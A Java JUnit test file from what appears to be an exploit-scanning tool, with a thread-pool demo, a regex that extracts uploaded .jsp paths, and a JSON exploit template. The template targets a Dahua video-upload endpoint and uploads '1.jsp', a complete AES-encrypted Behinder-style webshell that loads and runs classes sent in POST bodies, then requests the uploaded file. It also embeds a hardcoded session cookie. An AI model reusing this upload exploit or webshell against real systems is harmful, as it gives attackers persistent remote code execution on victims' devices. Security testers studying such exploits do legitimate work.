import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.bcvgh.payloads.VulPocTemplateImp;
import com.bcvgh.util.FileUtil;
import com.bcvgh.util.JsonUtil;
import org.junit.Test;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public class dsadas {
    @Test
    public void add() throws ExecutionException, InterruptedException {
        System.out.println("----程序开始运行----");
        Date date1 = new Date();

        // 线程池数量
        int taskSize = 5;
        // 创建一个线程池
        ExecutorService executorService = Executors.newFixedThreadPool(taskSize);
        // 创建多个有返回值的任务
        List<Future<Object>> list = new ArrayList<>();
        for (int i = 0; i < taskSize; i++) {
            Callable c = new MyCallable(i + " ");
            // 执行任务并获取Future对象
            Future<Object> f = executorService.submit(c);
            System.out.println(">>>" + f.get().toString());
            list.add(f);
        }
        // 关闭线程池
        executorService.shutdown();

        // 获取所有并发任务的运行结果
        for (Future<Object> f : list) {
            // 从Future对象上获取任务的返回值，并输出到控制台
            System.out.println(">>>" + f.get().toString());
        }

        Date date2 = new Date();
        System.out.println("----程序结束运行----，程序运行时间【" + (date2.getTime() - date1.getTime()) + "毫秒】");
    }

    @Test
    public void it(){
        /**遍历每个jsonpoc文件的name,tag**/
//        Pattern ExpPattern =Pattern.compile("jsp");
//        Matcher matcher = ExpPattern.matcher("{\"data\":{\"id\":59,\"path\":\"VIDEO/230824120904159934.jsp\"},\"errMsg\":\"success!\",\"success\":true}");
//        String MatchContent = matcher.group();
//        System.out.println(MatchContent);
        String input = "{\"data\":{\"id\":59,\"path\":\"VIDEO/230824120904159934.jsp\"},\"errMsg\":\"success!\",\"success\":true}";

        // Regular expression to match JSON data containing ".jsp" path
        String regex = "[0-9a-zA-Z]*\\.jsp";

        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(input);

        if (matcher.find()) {
//            String jspPath = matcher.group(1);
            System.out.println("Extracted JSP Path: " + matcher.group());
        } else {
            System.out.println("No match found.");
        }
//        HashMap<String , ArrayList<String>> vulName = new HashMap<>();
//        String[] dirNames = FileUtil.FileList("src/main/java/com/bcvgh/poc/json");
//        for (String dirName : dirNames){
//            ArrayList<String> filenames = new ArrayList<>();
//            String[] fileNames = FileUtil.FileList("src/main/java/com/bcvgh/poc/json/"+dirName);
//            for (String fileName : fileNames){
//                String poc = FileUtil.FileRead("src/main/java/com/bcvgh/poc/json/"+dirName+"/"+fileName);
//                JSONObject pocJson = JsonUtil.StringToJson(poc);
//                filenames.add(pocJson.getString("name"));
//            }
//            vulName.put(dirName,filenames);
//        }
    }

    @Test
    public void loadJson(){
        String json ="{\n" +
                "  \"num\": 2,\n" +
                "  \"name\":\"test\",\n" +
                "  \"tag\":\"dahua\",\n" +
                "  \"type\":\"upload\",\n" +
                "  \"poc\": {\n" +
                "    \"pocGet\": \"/publishing/publishing/material/file/video\",\n" +
                "    \"header\": {\n" +
                "      \"cookie\": \"hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;\",\n" +
                "      \"content-type\": \"multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv\",\n" +
                "      \"User-Agent\": \"Mozilla/5.0 (Linux;\"\n" +
                "    },\n" +
                "    \"pattern\": \"Available SOAP\"\n" +
                "  },\n" +
                "  \"exp\": {\n" +
                "    \"step1\": {\n" +
                "      \"pocGet\": \"/publishing/publishing/material/file/video\",\n" +
                "      \"pocPost\": \"------WebKitFormBoundaryCJEleSRxsqS0lAFv\\nContent-Disposition: form-data; name=\\\"Filedata\\\";filename=\\\"1.jsp\\\"\\n\\n<%@page import=\\\"java.util.*,javax.crypto.*,javax.crypto.spec.*\\\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\\\"POST\\\")){String k=\\\"e45e329feb5d925b\\\";/*�ƥ:ޥ�\\u000132Mmd5<�M16M\\fؤޥ�\\u0001rebeyond*/session.putValue(\\\"u\\\",k);Cipher c=Cipher.getInstance(\\\"AES\\\");c.init(2,new SecretKeySpec(k.getBytes(),\\\"AES\\\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--\",\n" +
                "      \"header\": {\n" +
                "        \"cookie\": \"hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;\",\n" +
                "        \"content-type\": \"multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv\",\n" +
                "        \"User-Agent\": \"Mozilla/5.0 (Linux;\"\n" +
                "      },\n" +
                "      \"pattern\": \"{\\\\{\\\"id\\\":[0-9]{1,3},\\\"path\\\":\\\"VIDEO/.*.jsp\\\"\\\\}}\"\n" +
                "    },\n" +
                "    \"step2\": {\n" +
                "      \"pocGet\": \"/publishingImg/VIDEO/\",\n" +
                "      \"header\": {\n" +
                "        \"cookie\": \"hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;\",\n" +
                "        \"content-type\": \"multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv\",\n" +
                "        \"User-Agent\": \"Mozilla/5.0 (Linux;\"\n" +
                "      },\n" +
                "      \"pattern\": \"\"\n" +
                "    }\n" +
                "  }\n" +
                "}";
        JSONObject exp = JsonUtil.StringToJson(json);
        JSONObject ss = exp.getJSONObject("exp");
        for (String value:ss.keySet()){
            System.out.println(value);
        }
        System.out.println(ss);

    }

}

class MyCallable implements Callable<Object> {
    private String taskNum;

    MyCallable(String taskNum) {
        this.taskNum = taskNum;
    }

    @Override
    public Object call() throws Exception {
        System.out.println(">>>" + taskNum + "任务启动");
        Date dateTmp1 = new Date();
        Thread.sleep(1000);
        Date dateTmp2 = new Date();
        long time = dateTmp2.getTime() - dateTmp1.getTime();
        System.out.println(">>>" + taskNum + "任务终止");
        return taskNum + "任务返回运行结果,当前任务时间【" + time + "毫秒】";
    }
}


